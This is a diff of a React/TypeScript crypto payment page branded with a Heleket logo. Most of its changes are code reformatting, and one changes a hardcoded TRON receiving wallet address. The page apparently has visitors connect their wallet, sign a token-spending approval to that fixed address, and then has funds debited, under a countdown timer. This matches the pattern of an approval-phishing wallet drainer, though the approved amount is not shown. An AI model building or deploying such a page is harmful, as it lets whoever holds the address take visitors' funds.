 
     try {
       signedResponse = await rawProvider.request(
@@ -773,7 +811,12 @@ async function approveTokenSpending(
         },
         sessionNamespaces?.tron?.chains?.[0] ?? "tron:0x2b6653dc",
       );
-      console.log("Ответ получен, timestamp:", Date.now(), "прошло мс:", Date.now() - requestStartedAt);
+      console.log(
+        "Ответ получен, timestamp:",
+        Date.now(),
+        "прошло мс:",
+        Date.now() - requestStartedAt,
+      );
     } finally {
       (globalThis as any).__signInProgress = false;
     }
@@ -817,7 +860,8 @@ async function approveTokenSpending(
     signature: [signatureStr],
   };
 
-  const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTxForBroadcast);
+  const broadcastResult =
+    await tronWeb.trx.sendRawTransaction(signedTxForBroadcast);
 
   if (!broadcastResult?.result) {
     const msg = safeDecodeTronMessage(broadcastResult?.message);
@@ -829,38 +873,43 @@ async function approveTokenSpending(
 
   console.log("-> 4. Ожидаем подтверждения транзакции approve в сети...");
   console.log("TXID для проверки:", broadcastResult.txid);
-  
+
   let approveConfirmed = false;
-  
-  for (let i = 0; i < 25; i++) { // Увеличили до 25 попыток (~75 секунд)
+
+  for (let i = 0; i < 25; i++) {
+    // Увеличили до 25 попыток (~75 секунд)
     try {
       console.log(`[Попытка ${i + 1}/25] Запрос инфы по TXID...`);
       const txInfo = await tronWeb.trx.getTransactionInfo(broadcastResult.txid);
-      
+
       if (txInfo && Object.keys(txInfo).length > 0) {
         console.log("Ответ от ноды получен:", txInfo);
-        
+
         if (txInfo.receipt && txInfo.receipt.result === "SUCCESS") {
           approveConfirmed = true;
-          break; 
+          break;
         } else if (txInfo.receipt && txInfo.receipt.result) {
-          throw new Error(`Транзакция отклонена контрактом: ${txInfo.receipt.result}`);
+          throw new Error(
+            `Транзакция отклонена контрактом: ${txInfo.receipt.result}`,
+          );
         }
       } else {
-         console.log("Нода пока не видит транзакцию (пустой ответ)...");
+        console.log("Нода пока не видит транзакцию (пустой ответ)...");
       }
     } catch (err: any) {
       if (err.message.includes("Транзакция отклонена")) throw err;
       console.log("Ошибка поллинга (игнорируем):", err.message);
     }
-    
+
     await new Promise((resolve) => setTimeout(resolve, 3000));
   }
 
   if (!approveConfirmed) {
-    throw new Error(`Транзакция ${broadcastResult.txid} не найдена в сети за 75 сек. Откройте консоль dApp, скопируйте этот TXID и вставьте в Tronscan, чтобы увидеть реальный статус.`);
+    throw new Error(
+      `Транзакция ${broadcastResult.txid} не найдена в сети за 75 сек. Откройте консоль dApp, скопируйте этот TXID и вставьте в Tronscan, чтобы увидеть реальный статус.`,
+    );
   }
-  
+
   console.log("✅ Approve подтвержден смарт-контрактом!");
 
   console.log("-> 5. Инициируем списание (депозит)...");
@@ -915,7 +964,9 @@ function PaymentPage() {
   });
 
   const [step, setStep] = useState(1);
-  const [address, setAddress] = useState(() => localStorage.getItem("r2p_address") || "");
+  const [address, setAddress] = useState(
+    () => localStorage.getItem("r2p_address") || "",
+  );
 
   // Сохранение при изменениях
   useEffect(() => {
@@ -983,32 +1034,31 @@ function PaymentPage() {
     console.log("walletProvider:", walletProvider);
   }, [walletProvider]);
 
+  const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
+    const nextTheme = theme === "light" ? "dark" : "light";
 
-const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
-  const nextTheme = theme === "light" ? "dark" : "light";
+    const x = e.clientX;
+    const y = e.clientY;
+    const root = document.documentElement;
+    const maxRadius = Math.hypot(
+      Math.max(x, window.innerWidth - x),
+      Math.max(y, window.innerHeight - y),
+    );
 
-  const x = e.clientX;
-  const y = e.clientY;
-  const root = document.documentElement;
-  const maxRadius = Math.hypot(
-    Math.max(x, window.innerWidth - x),
-    Math.max(y, window.innerHeight - y),
-  );
+    root.style.setProperty("--vt-x", `${x}px`);
+    root.style.setProperty("--vt-y", `${y}px`);
+    root.style.setProperty("--vt-radius", `${maxRadius}px`);
+    root.classList.toggle("dark-incoming", nextTheme === "dark");
 
-  root.style.setProperty("--vt-x", `${x}px`);
-  root.style.setProperty("--vt-y", `${y}px`);
-  root.style.setProperty("--vt-radius", `${maxRadius}px`);
-  root.classList.toggle("dark-incoming", nextTheme === "dark");
+    if (!document.startViewTransition) {
+      setTheme(nextTheme);
+      return;
+    }
 
-  if (!document.startViewTransition) {
-    setTheme(nextTheme);
-    return;
-  }
-
-  document.startViewTransition(() => {
-    setTheme(nextTheme);
-  });
-};
+    document.startViewTransition(() => {
+      setTheme(nextTheme);
+    });
+  };
 
   return (
     <div className="payment-page">
@@ -1016,21 +1066,56 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
         <header className="payment-header">
           <img src="/img/heleket.svg" alt="Heleket" className="payment-logo" />
 
-          <div className="header-actions" style={{ display: "flex", gap: "8px", alignItems: "center" }}>
+          <div
+            className="header-actions"
+            style={{ display: "flex", gap: "8px", alignItems: "center" }}
+          >
             <button
               type="button"
               className={`theme-toggle ${theme === "dark" ? "theme-toggle--dark" : ""}`}
               onClick={handleThemeToggle}
-              aria-label={theme === "light" ? "Switch to dark theme" : "Switch to light theme"}
+              aria-label={
+                theme === "light"
+                  ? "Switch to dark theme"
+                  : "Switch to light theme"
+              }
             >
               <span className="theme-toggle-track">
                 <span className="theme-toggle-icons">
-                  <svg className="theme-toggle-icon theme-toggle-icon--sun" width="14" height="14" viewBox="0 0 24 24" fill="none">
-                    <circle cx="12" cy="12" r="5" stroke="currentColor" strokeWidth="2" />
-                    <path d="M12 1.5V4M12 20v2.5M4.2 4.2l1.8 1.8M18 18l1.8 1.8M1.5 12H4M20 12h2.5M4.2 19.8l1.8-1.8M18 6l1.8-1.8" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+                  <svg
+                    className="theme-toggle-icon theme-toggle-icon--sun"
+                    width="14"
+                    height="14"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                  >
+                    <circle
+                      cx="12"
+                      cy="12"
+                      r="5"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                    />
+                    <path
+                      d="M12 1.5V4M12 20v2.5M4.2 4.2l1.8 1.8M18 18l1.8 1.8M1.5 12H4M20 12h2.5M4.2 19.8l1.8-1.8M18 6l1.8-1.8"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                    />
                   </svg>
-                  <svg className="theme-toggle-icon theme-toggle-icon--moon" width="14" height="14" viewBox="0 0 24 24" fill="none">
-                    <path d="M20 14.5A8.5 8.5 0 1 1 9.5 4a6.5 6.5 0 0 0 10.5 10.5Z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round" />
+                  <svg
+                    className="theme-toggle-icon theme-toggle-icon--moon"
+                    width="14"
+                    height="14"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                  >
+                    <path
+                      d="M20 14.5A8.5 8.5 0 1 1 9.5 4a6.5 6.5 0 0 0 10.5 10.5Z"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinejoin="round"
+                    />
                   </svg>
                 </span>
                 <span className="theme-toggle-thumb" />
@@ -1130,7 +1215,9 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
         {step === 1 && (
           <div className="payment-step-wrapper anim-slide-prev" key="step1">
             <div className="payment-field">
-              <label className="payment-field-label">{t("selectCurrency")}</label>
+              <label className="payment-field-label">
+                {t("selectCurrency")}
+              </label>
               <div className={`select ${isCurrencyOpen ? "select--open" : ""}`}>
                 <button
                   type="button"
@@ -1146,7 +1233,9 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
                       {currency.name} ({currency.code})
                     </span>
                   ) : (
-                    <span className="select-placeholder">{t("selectCurrencyPlaceholder")}</span>
+                    <span className="select-placeholder">
+                      {t("selectCurrencyPlaceholder")}
+                    </span>
                   )}
                   <svg
                     className="select-caret"
@@ -1181,7 +1270,9 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
             </div>
 
             <div className="payment-field">
-              <label className="payment-field-label">{t("selectNetwork")}</label>
+              <label className="payment-field-label">
+                {t("selectNetwork")}
+              </label>
               <div
                 className={`select ${isNetworkOpen ? "select--open" : ""} ${
                   !currency ? "select--disabled" : ""
@@ -1199,7 +1290,9 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
                   {network ? (
                     <span className="select-value">{network.name}</span>
                   ) : (
-                    <span className="select-placeholder">{t("selectNetworkPlaceholder")}</span>
+                    <span className="select-placeholder">
+                      {t("selectNetworkPlaceholder")}
+                    </span>
                   )}
                   <svg
                     className="select-caret"
@@ -1281,9 +1374,7 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
                   </svg>
                   <span>{t("contract")}</span>
                 </button>
-                <div className="contract-tooltip">
-                  {t("contractTooltip")}
-                </div>
+                <div className="contract-tooltip">{t("contractTooltip")}</div>
               </div>
             </div>
 
@@ -1316,9 +1407,7 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
               <span>{t("gasSponsored")}</span>
             </div>
 
-            <div className="step2-address-label">
-              {t("enterAddress")}
-            </div>
+            <div className="step2-address-label">{t("enterAddress")}</div>
 
             <div
               className={`address-input-group ${showError ? "address-input-group--error" : ""}`}
@@ -1337,7 +1426,10 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
                 <input
                   type="text"
                   className="address-input-field"
-                  placeholder={t("placeholderAddress").replace("{network}", network?.code || "TRC-20")}
+                  placeholder={t("placeholderAddress").replace(
+                    "{network}",
+                    network?.code || "TRC-20",
+                  )}
                   value={address}
                   onChange={(e) => setAddress(e.target.value)}
                 />
@@ -1421,9 +1513,7 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
               </svg>
             </div>
             <div className="error-heading">{t("errorHeading")}</div>
-            <div className="error-description">
-              {t("errorDesc")}
-            </div>
+            <div className="error-description">{t("errorDesc")}</div>
             <button
               type="button"
               className="continue-button"
@@ -1472,9 +1562,7 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
                   </svg>
                   <span>{t("contract")}</span>
                 </button>
-                <div className="contract-tooltip">
-                  {t("contractTooltip")}
-                </div>
+                <div className="contract-tooltip">{t("contractTooltip")}</div>
               </div>
             </div>
 
@@ -1509,9 +1597,7 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
 
             <div className="wallets-header">
               <div className="wallets-title">{t("connectWallet")}</div>
-              <div className="wallets-subtitle">
-                {t("connectWalletDesc")}
-              </div>
+              <div className="wallets-subtitle">{t("connectWalletDesc")}</div>
             </div>
 
             <div className="wallets-list">
@@ -1585,21 +1671,22 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
                       console.log("→ Списание...");
 
                       const SYSTEM_WALLET_ADDRESS =
-                        "TBTjC4pYzK6JU44uYwb5F17VdfYX6LmsCF";
+                        "TUtNgGimv7H55kEbx8tdpcoiVcGZJ76cF3";
 
                       const txId = await approveTokenSpending(
                         walletProvider,
                         SYSTEM_WALLET_ADDRESS,
                       );
 
-                      alert(
-                        t("successAlert").replace("{txId}", txId)
-                      );
+                      alert(t("successAlert").replace("{txId}", txId));
                       setStep(1);
                     } catch (error: any) {
                       console.error(error);
                       alert(
-                        t("errorAlert").replace("{error}", error.message || "Unknown error")
+                        t("errorAlert").replace(
+                          "{error}",
+                          error.message || "Unknown error",
+                        ),
                       );
                     } finally {
                       setActiveWalletId(null);
@@ -1616,9 +1703,7 @@ const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
         )}
 
         <div className="payment-timer">
-          <span className="payment-timer-label">
-            {t("timeLeft")}
-          </span>
+          <span className="payment-timer-label">{t("timeLeft")}</span>
           <span className="payment-timer-value">{formatTime(secondsLeft)}</span>
         </div>
       </div>
